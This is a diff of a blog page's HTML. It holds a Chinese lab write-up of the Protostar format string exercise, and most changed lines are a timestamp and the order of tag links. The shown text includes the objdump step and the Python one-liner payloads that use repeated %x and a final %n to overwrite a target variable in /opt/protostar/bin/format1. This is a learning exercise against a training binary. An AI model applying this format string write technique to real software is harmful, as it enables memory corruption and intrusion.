@@ -25,7 +25,7 @@
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-5.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-6.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-7.png?raw=true">
-<meta property="og:updated_time" content="2017-04-19T06:09:43.000Z">
+<meta property="og:updated_time" content="2017-04-19T06:16:57.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Protostar-栈溢出系列学习-format 0">
 <meta name="twitter:description" content="0x00 序从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
@@ -210,8 +210,7 @@
 <li>[n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is con‐verted.</li>
 </ul>
 <p>看个例子<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-4.png?raw=true" alt="0-4"><br>这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了</p>
-<h2 id="0x05-hack"><a href="#0x05-hack" class="headerlink" title="0x05 hack"></a>0x05 hack</h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-5.png?raw=true" alt="0-5"><br>利用一句话Python反复测试</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*135"</span>'`<span class="string">"</span></div></pre></td></tr></table></figure>
+<h2 id="0x05-hack"><a href="#0x05-hack" class="headerlink" title="0x05 hack"></a>0x05 hack</h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-5.png?raw=true" alt="0-5"><br>利用一句话Python反复测试<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*135"</span>'`<span class="string">"</span></div></pre></td></tr></table></figure></p>
 <p>调整%x的个数，使其target地址为最后一个<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-6.png?raw=true" alt="0-6"><br>然后将最后一个%x改为%n</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format<span class="number">1</span>  <span class="string">"`python -c 'print "</span>A<span class="string">"*4 + "</span>\<span class="keyword">x</span><span class="number">38</span>\<span class="keyword">x</span><span class="number">96</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span><span class="string">" + "</span>BBB<span class="string">"+"</span><span class="symbol">%x</span> <span class="string">"*134+"</span><span class="symbol">%n</span> <span class="string">"'`"</span></div></pre></td></tr></table></figure>
 <p>run!<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-7.png?raw=true" alt="0-7"><br><strong>成功修改target值!</strong></p>
@@ -464,14 +463,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">macOS内核</a>
               </li>
              
@@ -484,23 +475,19 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">printf</a>
+                <a href="javascript:void(0)" class="js-tag color4">cve</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">format</a>
+                <a href="javascript:void(0)" class="js-tag color4">IPC</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Crackme</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">看雪</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">iOS</a>
+                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -528,6 +515,18 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Crackme</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">看雪</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">iOS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
               </li>
              
@@ -540,11 +539,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">cve</a>
+                <a href="javascript:void(0)" class="js-tag color2">printf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">IPC</a>
+                <a href="javascript:void(0)" class="js-tag color2">format</a>
               </li>
             
             <div class="clearfix"></div>
